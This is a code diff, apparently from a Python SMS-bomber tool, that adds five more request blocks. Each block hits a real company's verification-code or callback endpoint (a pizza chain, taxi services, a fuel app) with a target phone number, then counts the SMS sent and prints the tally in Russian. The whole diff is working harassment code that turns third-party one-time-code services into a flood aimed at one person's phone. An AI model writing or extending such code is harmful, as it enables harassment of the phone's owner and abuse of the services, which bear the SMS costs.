@@ -5219,7 +5219,77 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
+		
+            try:
+                requests.post(
+                    "https://api-rest.logistictech.ru/api/v1.1/clients/request-code",
+                    json={"phone": _phone,},
+                    headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"},
+                )
+                kk = kk + 1
+                print(
+                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
+                )
+                time.sleep(0.2)
+            except:
+                print(f"{r}Не отправлено :({rs}")
 
+            try:
+                requests.post(
+                    "https://pizzasinizza.ru/api/phoneCode.php",
+                    json={"phone": _phone,},
+                )
+                kk = kk + 1
+                print(
+                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
+                )
+                time.sleep(0.2)
+            except:
+                print(f"{r}Не отправлено :({rs}")
+		
+            try:
+                requests.get(
+                    "https://vezitaxi.com/api/employment/getsmscode",
+                    params={
+                    	"phone": "+" + _phone,
+                    	"city": 561,
+                    	"callback": "jsonp_callback_35979",
+            	    },
+                )
+                kk = kk + 1
+                print(
+                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
+                )
+                time.sleep(0.2)
+            except:
+                print(f"{r}Не отправлено :({rs}")
+		
+            try:
+                requests.post(
+                    "https://app.benzuber.ru/login",
+                    data={"phone": "+" + _phone},
+                )
+                kk = kk + 1
+                print(
+                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
+                )
+                time.sleep(0.2)
+            except:
+                print(f"{r}Не отправлено :({rs}")
+		
+            try:
+                requests.post(
+                    "https://3040.com.ua/taxi-ordering",
+                    data={"callback-phone": _phone},
+                )
+                kk = kk + 1
+                print(
+                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
+                )
+                time.sleep(0.2)
+            except:
+                print(f"{r}Не отправлено :({rs}")
+		
             kolvo = kolvo + 1
             if kolvo == kolvos:
                 print(
